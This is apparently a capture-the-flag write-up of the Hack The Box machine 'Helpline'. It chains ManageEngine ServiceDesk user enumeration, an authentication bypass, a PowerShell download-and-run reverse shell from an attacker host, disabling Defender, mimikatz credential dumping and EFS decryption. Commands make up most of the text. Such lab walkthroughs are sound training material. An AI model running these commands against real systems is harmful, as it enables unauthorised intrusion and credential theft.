Looport 5985 (winrm) Remote management users
port 445 (smb)
port 8080 (http)

There is an SMB service running, and I use crackmapexec to gather additional information about the target machine

``` 
❯ crackmapexec smb 10.10.10.132
SMB         10.10.10.132    445    HELPLINE         [*] Windows 10.0 Build 17763 x64 (name:HELPLINE) (domain:HELPLINE) (signing:False) (SMBv1:False)
```

Now I'm going to use smbmap to enumerate all the shared drives across the entire domain.

```
smbmap -H 10.10.10.132 -u 'null'
[!] Authentication error on 10.10.10.132
```

the access is denied, so I need to enumerate more things, like the port 8080, which hosts a website.

On this website, I discovered a login panel for an application called "ManageEngine ServiceDesk plus", 
I was able to log in as guest. Now, I'm using searchsploit to look for exploits related to this application.

I found a vulnerability in this application that allows me to enumerate users just by using the path  "/servlet/AJaxServlet?action=checkUser&search=guest"
If the response is "true", it means the user exists. So I'll create a bash script to brute force this to find the valid users

``` bash
cat /usr/share/seclist/Usernames/top-usernames-shortlist.txt | while read username; do echo -e "\n[*] Trying Username -> $username\n"; curl -s "http://10.10.10.132:8080/servlet/AjaxServlet?action=checkUser&search=$username" -H "Cookie: JSESSIONID=4534545; JSE4355; _rem=erwe_; mes2343"; done | grep "true" -B 2
```

There are two users: "administrator" and "guest"

Upon searching for vulnerabilities using searchsploit, I found an "Authentication Bypass" vulnerability.
"An attacker can use the following URL to login to the mobile client" -> http://10.10.10.132:8080/mc/
"Use the discovered username in both the username and password fields" In my case "administrator" "administrator"
"Once logged in, remove /mc from the URL and you will be presented with the full application and the authorities of the user you just logged in"

Effectively,  I'm now logged in as the administrator.
There is also a method to achieve Remote code execution and gain access to the victim's system using "Invoke-PowerShellTcp.ps1" from Nishang

```
#On my machine
> echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/Invoke-PowerShellTcp.ps1')" | iconv -t utf-16le | base64 -w 0; echo
> rlwrap nc -nlvp 1234

#On the website
Go to -> Admin -> custom triggers -> Add new action -> Action Name: RCE -> Match the following criteria -> Sender - Is not  - "something"
	  -> Perform action -> run script -> cmd /c powershell -nop -enc base64
Go to -> Request -> new incident
 ```

I have gained access to the system as "nt authority\system", but I can't read the flags (search for the flag -> cmd /c dir /r /s user.txt)
It appears that the file is encrypted. Confirming this, I executed the command "cipher /c user.txt/root.txt" which confirmed the encryption and indicated that only the users 'tolu' and 'administrator' cad decrypt it.

To proceed, I'm going to use mimikatz to obtain the NTLM hashes from the system https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919
Before uploading mimikatz to the victim machine, I need to disable windows defender, I can do this because I have elevated privileges on the victim machine as 'nt authority\system'

``` powershell
-> cd \ProgramData
-> Set-MpPreference -DisableRealtimeMonitoring $true
-> iwr -uri http://10.10.14.3/mimikatz.exe -OutFile mimikatz.exe "exit"
	certutil.exe -f -urlcache -split http://10.10.14.3/mimikatz.exe mimikatz.exe "exit"
-> .\mimikatz.exe log hash.txt "exit"
-> .\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
zachary:0987654321
```

I now have the hashes, and I'll crack them using the web-based tool CrackStation.
I successfully retrieved password "0987654321" associated with the user "zachary"
Now i'm going to check if this credentials are valid
``` bash
crackmapexec smb 10.10.10.132 -u 'zachary' -p '0987654321'
```

The credentials are correct, but the user doesn't have the respective privilege "remote management users" that allows me to connect via WinRm.
When looking at the privilege for that user, it has the "Event Log Readers" privilege. I can achieve the same functionality with the current user I have. To do this, I use the script  [Get-WinEventData.ps1](https://github.com/RamblingCookieMonster/PowerShell/blob/master/Get-WinEventData.ps1 "Get-WinEventData.ps1")


``` powershell
#on my machine
wget https://raw.githubusercontent.com/RamblingCookieMonster/PowerShell/master/Get-WinEventData.ps1
sudo python -m http.server 80

#on victim machine
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/Get-WinEventData.ps1')
Get-WinEvent -FilterHashtable @{Logname='security';id=4688} | Get-WinEventData | Select e_CommandLine | ft -AutoSize

USER:tolu /P !zaq1234567890pl!99
```

Checkin these logs, I obtained the password for the user "tolu" 
Now with these credentials, I can decrypt de user's flag. https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files

``` powershell
#on the victim machine
cipher /c user.txt
# copy the certificate thumbprint
# Use mimikatz
-> ./mimikatz.exe "crypto::system /file:C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29 /export" "exit"
# this create a .der file, now I download it to my machine
# use base64 to copy the file to my machine
-> [convert]::ToBase64String((Get-Content -path "your_file_path" -Encoding byte))
#on my machine
echo "base64" | base64 -d > 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der 

#on the victim machine
dir C:\Users\tolu\AppData\Roaming\Microsoft\Protect\S-1...... -Force
.\mimikatz "dpapi::masterkey /in:C:\Users\tolu\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017 /password:!zaq1234567890pl!99" "exit"
#save the sha1 hash (masterkey)
sha1: 8ece5985210c26ecf3dd9c53a38fc58478100ccb

-> .\mimikatz "dpapi::capi /in:C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85 /masterkey:8ece5985210c26ecf3dd9c53a38fc58478100ccb" "exit"
#this export a .pvk file
#now transfer it to my machine
dpapi_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.keyx.rsa.pvk
[convert]::ToBase64String((Get-Content -path "your_file_path" -Encoding byte))
``` 

Now I use openssl to creat the public key on my machine
``` bash
-> openssl x509 -inform DER -outform PEM -in B53C6DE283C00203587A03DD3D0BF66E16969A55.der -out public.pem
-> openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_ffb75517-bc6c-4a40-8f8b-e2c555e30e34.pvk -out private.pem
-> openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
#whit this i have the .pfx file, I need to transfer this file to the victim machine
-> sudo python -m http.server 80
# on victim machine
-> iwr -uri http://10.10.14.3/cert.pfx -OutFile cert.pfx
-> certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot
-> type \Users\tolu\Desktop\user.txt
0d522fa8d6d2671636ac7e73216808d3
```

Whit this entire process, I can decrypt the user.txt file successfully.
Now, I need to decrypt the root.txt file, but I lack the Administrator password.
While enumerating the sistem,  the user "leo" has a  "admin-pass.xml" file,  but it's encrypter. I'll need to follow a similar process as before to decrypt it, but I don't have the password for this user.

I noticed that the user "leo" has a console open when I ran the command "tasklist /v".  To exploit this and attempt to migrate or impersonate this user, I will use the software "tightvnc"

``` bash
#download tightvnc  https://www.tightvnc.com/download.php
sudo python -m http.server 80

#on victim machine
-> iwr -uri http://10.10.14.3/tightvnc.msi
-> cmd /c msiexec /i tightvnc.msi /quiet /norestart ADDLOCAL="Server,Viewer" VIEWER_ASSOCIATE_VNC_EXTENSION=1 SERVER_REGISTER_AS_SERVICE=1 SERVER_ADD_FIREWALL_EXCEPTION=1 VIEWER_ADD_FIREWALL_EXCEPTION=1 SERVER_ALLOW_SAS=1 SET_USEVNCAUTHENTICATION=1 VALUE_OF_USEVNCAUTHENTICATION=1 SET_PASSWORD=1 VALUE_OF_PASSWORD=PASSWORD SET_USECONTROLAUTHENTICATION=1 VALUE_OF_USECONTROLAUTHENTICATION=1 SET_CONTROLPASSWORD=1 VALUE_OF_CONTROLPASSWORD=PASSWORD

#on my machine
vncviewer 10.10.10.132

```

I'm currently within the victim machine, logged in as the user 'leo'. Now, I have the ability to access the 'admin-pass.xml' file. This file contains a securely encrypted string that is easy to decrypt.

``` powershell
-> powershell 
-> $s = cat .\admin-pass.xml
-> $ss = ConvertTo-SecureString $s
-> $cred = New-Object System.Management.Automation.PSCredential('administrator', $ss)
-> $cred.getNetworkCredential() | fl
UserName       : administrator
Password       : mb@letmein@SERVER#acc
SecurePassword : System.Security.SecureString
Domain         :

```

Now I have the credentials for the user Administrator and can read the root.txt
``` powershell
runas /user:Administrator cmd.exe
cd \Users\Administrator\Desktop
type root.txt
d814211fc0538e50a008afd817f75a2c 
```

And in this way I solve this machine Helpline from Hack The Box

